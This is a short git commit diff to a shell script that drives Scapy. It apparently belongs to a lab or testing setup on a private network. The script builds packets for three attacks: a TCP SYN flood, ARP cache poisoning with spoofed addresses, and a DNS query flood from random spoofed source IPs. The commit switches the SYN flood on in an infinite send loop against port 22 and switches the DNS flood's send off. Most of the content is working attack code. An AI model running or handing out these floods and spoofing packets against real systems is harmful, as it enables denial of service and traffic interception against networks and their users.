1904c69d8f5c83592b372acd32333bdb69158a96
Pavel <pavel.benacek@gmail.com>
2011-12-20 18:03:18 +0100

    scapy: upraveny prikazy pro posilani pomoci scapy

--- scapy/SCAP_GEN.sh
+++ scapy/SCAP_GEN.sh
@@ -2,8 +2,8 @@
 
 ###### PARAMETRY #################
 #1)SYN ATTACK PARAMETRY
-SYN_DST_ADDRESS="192.168.1.1"
-SYN_DST_PORT=80
+SYN_DST_ADDRESS="192.168.1.13"
+SYN_DST_PORT=22
 #2)ARP poissoning
 VICTIM_MAC="00:00:00:00:00:00"
 SPOOFED_SENDER_IP="192.168.1.1"
@@ -18,7 +18,7 @@ scapy <<-END
 #1)generovani paketu pro SYN
 packetSYN=IP(dst="$SYN_DST_ADDRESS")/TCP(dport=$SYN_DST_PORT, flags='S')
 ls(packetSYN)
-#send(packetSYN,loop=1) #posilej paket v nekonecne smycce
+send(packetSYN,loop=1) #posilej paket v nekonecne smycce
 
 #2)ARP poisoning
 packetARP=Ether(dst="$VICTIM_MAC")/ARP(op="is-at",hwsrc="$ATTACKER_MAC",psrc="$SPOOFED_SENDER_IP",pdst="$SPOOFED_IP")
@@ -28,5 +28,5 @@ ls(packetARP)
 #3)DNS flood
 dnsq=IP(dst="$DNS_FLOOD_VICTIM",src=RandIP())/UDP()/DNS(rd=1,qr=0,qd=DNSQR(qname='$DNS_QUERY',qtype='A',qclass='IN'))
 ls(dnsq)
-send(dnsq,loop=1)
+#send(dnsq,loop=1)
 END
